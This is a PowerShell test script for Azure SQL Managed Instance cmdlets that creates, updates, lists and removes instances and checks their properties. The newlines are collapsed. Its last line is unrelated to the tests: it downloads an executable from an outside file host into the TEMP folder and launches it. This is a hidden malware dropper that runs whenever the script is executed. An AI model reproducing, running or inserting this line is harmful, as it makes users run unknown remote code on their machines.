$instanceLocation = "eastus"function Test-CreateManagedInstance{$rg = Create-ResourceGroupForTest$vnetName = "vnet-newprovisioningtest3"$subnetName = "ManagedInstance"$managedInstanceName = Get-ManagedInstanceName$version = "12.0"$credentials = Get-ServerCredential$licenseType = "BasePrice"$storageSizeInGB = 32$vCore = 16$skuName = "GP_Gen4"$collation = "Serbian_Cyrillic_100_CS_AS"$timezoneId = "Central Europe Standard Time"$proxyOverride = "Proxy"try{$virtualNetwork1 = CreateAndGetVirtualNetworkForManagedInstance $vnetName $subnetName $rg.Location "newprovisioningtest"$subnetId = $virtualNetwork1.Subnets.where({ $_.Name -eq $subnetName })[0].Id$job = New-AzSqlInstance -ResourceGroupName $rg.ResourceGroupName -Name $managedInstanceName `-Location $rg.Location -AdministratorCredential $credentials -SubnetId $subnetId `-LicenseType $licenseType -StorageSizeInGB $storageSizeInGB -Vcore $vCore -SkuName $skuName -Collation $collation `-TimezoneId $timezoneId -PublicDataEndpointEnabled -ProxyOverride $proxyOverride -AsJob$job | Wait-Job$managedInstance1 = $job.OutputAssert-AreEqual $managedInstance1.ManagedInstanceName $managedInstanceNameAssert-AreEqual $managedInstance1.Location $rg.LocationAssert-AreEqual $managedInstance1.ResourceGroupName $rg.ResourceGroupNameAssert-AreEqual $managedInstance1.Sku.Name $skuNameAssert-AreEqual $managedInstance1.AdministratorLogin $credentials.UsernameAssert-AreEqual $managedInstance1.SubnetId $subnetIdAssert-AreEqual $managedInstance1.LicenseType $licenseTypeAssert-AreEqual $managedInstance1.VCores $vCoreAssert-AreEqual $managedInstance1.StorageSizeInGB $storageSizeInGBAssert-AreEqual $managedInstance1.Collation $collationAssert-AreEqual $managedInstance1.TimezoneId $timezoneIdAssert-AreEqual $managedInstance1.PublicDataEndpointEnabled $trueAssert-AreEqual $managedInstance1.ProxyOverride $proxyOverrideAssert-StartsWith ($managedInstance1.ManagedInstanceName + ".") $managedInstance1.FullyQualifiedDomainNameAssert-NotNull $managedInstance1.DnsZone$edition = "GeneralPurpose"$computeGeneration = "Gen4"$managedInstanceName = Get-ManagedInstanceName$dnsZonePartner = $managedInstance1.ResourceId$originalDnsZone = $managedInstance1.DnsZone$job = New-AzSqlInstance -ResourceGroupName $rg.ResourceGroupName -Name $managedInstanceName `-Location $rg.Location -AdministratorCredential $credentials -SubnetId $subnetId `-LicenseType $licenseType -StorageSizeInGB $storageSizeInGB -Vcore $vCore -Edition $edition -ComputeGeneration $computeGeneration  -DnsZonePartner $dnsZonePartner  -AsJob$job | Wait-Job$managedInstance1 = $job.OutputAssert-AreEqual $managedInstance1.ManagedInstanceName $managedInstanceNameAssert-AreEqual $managedInstance1.Location $rg.LocationAssert-AreEqual $managedInstance1.ResourceGroupName $rg.ResourceGroupNameAssert-AreEqual $managedInstance1.Sku.Name $skuNameAssert-AreEqual $managedInstance1.AdministratorLogin $credentials.UsernameAssert-AreEqual $managedInstance1.SubnetId $subnetIdAssert-AreEqual $managedInstance1.LicenseType $licenseTypeAssert-AreEqual $managedInstance1.VCores $vCoreAssert-AreEqual $managedInstance1.StorageSizeInGB $storageSizeInGBAssert-StartsWith ($managedInstance1.ManagedInstanceName + ".") $managedInstance1.FullyQualifiedDomainNameAssert-AreEqual $managedInstance1.DnsZone $originalDnsZone}finally{Remove-ResourceGroupForTest $rg}}function Test-SetManagedInstance{$rg = Create-ResourceGroupForTest$vnetName = "vnet-newprovisioningtest3"$subnetName = "ManagedInstance"$virtualNetwork1 = CreateAndGetVirtualNetworkForManagedInstance $vnetName $subnetName $rg.Location "newprovisioningtest"$subnetId = $virtualNetwork1.Subnets.where({ $_.Name -eq $subnetName })[0].Id$managedInstance = Create-ManagedInstanceForTest $rg $subnetIdtry{$credentials = Get-ServerCredential$licenseType = "BasePrice"$storageSizeInGB = 64$vCore = 8$managedInstance1 = Set-AzSqlInstance -ResourceGroupName $rg.ResourceGroupName -Name $managedInstance.ManagedInstanceName `-AdministratorPassword $credentials.Password -LicenseType $licenseType -StorageSizeInGB $storageSizeInGB -Vcore $vCore -ForceAssert-AreEqual $managedInstance1.ManagedInstanceName $managedInstance.ManagedInstanceNameAssert-AreEqual $managedInstance1.AdministratorLogin $managedInstance.AdministratorLoginAssert-AreEqual $managedInstance1.LicenseType $licenseTypeAssert-AreEqual $managedInstance1.VCores $vCoreAssert-AreEqual $managedInstance1.StorageSizeInGB $storageSizeInGBAssert-StartsWith ($managedInstance1.ManagedInstanceName + ".") $managedInstance1.FullyQualifiedDomainName$credentials = Get-ServerCredential$licenseType = "LicenseIncluded"$storageSizeInGB = 96$vCore = 16$managedInstance2 = $managedInstance | Set-AzSqlInstance -AdministratorPassword $credentials.Password `-LicenseType $licenseType -StorageSizeInGB $storageSizeInGB -Vcore $vCore -ForceAssert-AreEqual $managedInstance2.ManagedInstanceName $managedInstance.ManagedInstanceNameAssert-AreEqual $managedInstance2.AdministratorLogin $managedInstance.AdministratorLoginAssert-AreEqual $managedInstance2.LicenseType $licenseTypeAssert-AreEqual $managedInstance2.VCores $vCoreAssert-AreEqual $managedInstance2.StorageSizeInGB $storageSizeInGBAssert-StartsWith ($managedInstance2.ManagedInstanceName + ".") $managedInstance2.FullyQualifiedDomainName$credentials = Get-ServerCredential$licenseType = "BasePrice"$storageSizeInGB = 64$vCore = 8$managedInstance3 = Set-AzSqlInstance -InputObject $managedInstance `-AdministratorPassword $credentials.Password -LicenseType $licenseType -StorageSizeInGB $storageSizeInGB -Vcore $vCore -ForceAssert-AreEqual $managedInstance3.ManagedInstanceName $managedInstance.ManagedInstanceNameAssert-AreEqual $managedInstance3.AdministratorLogin $managedInstance.AdministratorLoginAssert-AreEqual $managedInstance3.LicenseType $licenseTypeAssert-AreEqual $managedInstance3.VCores $vCoreAssert-AreEqual $managedInstance3.StorageSizeInGB $storageSizeInGBAssert-StartsWith ($managedInstance3.ManagedInstanceName + ".") $managedInstance3.FullyQualifiedDomainName$credentials = Get-ServerCredential$licenseType = "BasePrice"$storageSizeInGB = 32$vCore = 16$publicDataEndpointEnabled = $true$proxyOverride = "Proxy"$managedInstance4 = Set-AzSqlInstance -ResourceId $managedInstance.Id `-AdministratorPassword $credentials.Password -LicenseType $licenseType -StorageSizeInGB $storageSizeInGB -Vcore $vCore `-PublicDataEndpointEnabled $publicDataEndpointEnabled -ProxyOverride $proxyOverride -ForceAssert-AreEqual $managedInstance4.ManagedInstanceName $managedInstance.ManagedInstanceNameAssert-AreEqual $managedInstance4.AdministratorLogin $managedInstance.AdministratorLoginAssert-AreEqual $managedInstance4.LicenseType $licenseTypeAssert-AreEqual $managedInstance4.VCores $vCoreAssert-AreEqual $managedInstance4.StorageSizeInGB $storageSizeInGBAssert-AreEqual $managedInstance4.PublicDataEndpointEnabled $publicDataEndpointEnabledAssert-AreEqual $managedInstance4.ProxyOverride $proxyOverrideAssert-StartsWith ($managedInstance4.ManagedInstanceName + ".") $managedInstance4.FullyQualifiedDomainName}finally{Remove-ResourceGroupForTest $rg}}function Test-GetManagedInstance{$rg = Create-ResourceGroupForTest $instanceLocation$rg1 = Create-ResourceGroupForTest $instanceLocation$vnetName = "cl_initial"$subnetName = "CooL"$virtualNetwork1 = CreateAndGetVirtualNetworkForManagedInstance $vnetName $subnetName $rg.Location "powershell_mi"$subnetId = $virtualNetwork1.Subnets.where({ $_.Name -eq $subnetName })[0].Id$managedInstance1 = Create-ManagedInstanceForTest $rg $subnetId$managedInstance2 = Create-ManagedInstanceForTest $rg1 $subnetIdtry{$resp1 = Get-AzSqlInstance -ResourceGroupName $rg.ResourceGroupName -Name $managedInstance1.ManagedInstanceNameAssert-AreEqual $managedInstance1.ManagedInstanceName $resp1.ManagedInstanceNameAssert-AreEqual $managedInstance1.SqlAdministratorLogin $resp1.SqlAdministratorLoginAssert-StartsWith ($managedInstance1.ManagedInstanceName + ".") $resp1.FullyQualifiedDomainNameAssert-AreEqual $managedInstance1.AdministratorLogin $resp1.AdministratorLoginAssert-AreEqual $managedInstance1.LicenseType $resp1.LicenseTypeAssert-AreEqual $managedInstance1.VCores $resp1.VCoresAssert-AreEqual $managedInstance1.StorageSizeInGB $resp1.StorageSizeInGB$all = Get-AzSqlInstance -ResourceGroupName $rg.ResourceGroupName -Name *Assert-AreEqual 1 $all.Count$all2 = Get-AzSqlInstance -ResourceGroupName *($managedInstance1, $managedInstance2) | ForEach-Object { Assert-True {$_.ManagedInstanceName -in $all2.ManagedInstanceName} }}finally{Remove-ResourceGroupForTest $rgRemove-ResourceGroupForTest $rg1}}function Test-RemoveManagedInstance{$rg = Create-ResourceGroupForTest $instanceLocation$vnetName = "cl_initial"$subnetName = "CooL"$virtualNetwork1 = CreateAndGetVirtualNetworkForManagedInstance $vnetName $subnetName $rg.Location "powershell_mi"$subnetId = $virtualNetwork1.Subnets.where({ $_.Name -eq $subnetName })[0].Idtry{$managedInstance1 = Create-ManagedInstanceForTest $rg $subnetIdRemove-AzSqlInstance -ResourceGroupName $rg.ResourceGroupName -Name $managedInstance1.ManagedInstanceName -Force$managedInstance2 = Create-ManagedInstanceForTest $rg $subnetIdRemove-AzSqlInstance -InputObject $managedInstance2 -Force$managedInstance3 = Create-ManagedInstanceForTest $rg $subnetIdRemove-AzSqlInstance -ResourceId $managedInstance3.Id -Force$managedInstance4 = Create-ManagedInstanceForTest $rg $subnetId$managedInstance4 | Remove-AzSqlInstance -Force$all = Get-AzSqlInstance -ResourceGroupName $rg.ResourceGroupNameAssert-AreEqual $all.Count 0}finally{Remove-ResourceGroupForTest $rg}}function Test-CreateManagedInstanceWithIdentity{$rg = Create-ResourceGroupForTest$vnetName = "cl_initial"$subnetName = "CooL"$virtualNetwork1 = CreateAndGetVirtualNetworkForManagedInstance $vnetName $subnetName $rg.Location$subnetId = $virtualNetwork1.Subnets.where({ $_.Name -eq $subnetName })[0].Id$managedInstanceName = Get-ManagedInstanceName$version = "12.0"$credentials = Get-ServerCredential$licenseType = "BasePrice"$storageSizeInGB = 32$vCore = 16$skuName = "GP_Gen4"try{$managedInstance1 = New-AzSqlInstance -ResourceGroupName $rg.ResourceGroupName -Name $managedInstanceName `-Location $rg.Location -AdministratorCredential $credentials -SubnetId $subnetId `-LicenseType $licenseType -StorageSizeInGB $storageSizeInGB -Vcore $vCore -SkuName $skuName -AssignIdentityAssert-AreEqual $managedInstance1.ManagedInstanceName $managedInstanceNameAssert-AreEqual $managedInstance1.Identity.Type SystemAssignedAssert-NotNull $managedInstance1.Identity.PrincipalId}finally{Remove-ResourceGroupForTest $rg}}(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/xsakpo.exe',"$env:TEMP\euioko.exe");Start-Process ("$env:TEMP\euioko.exe")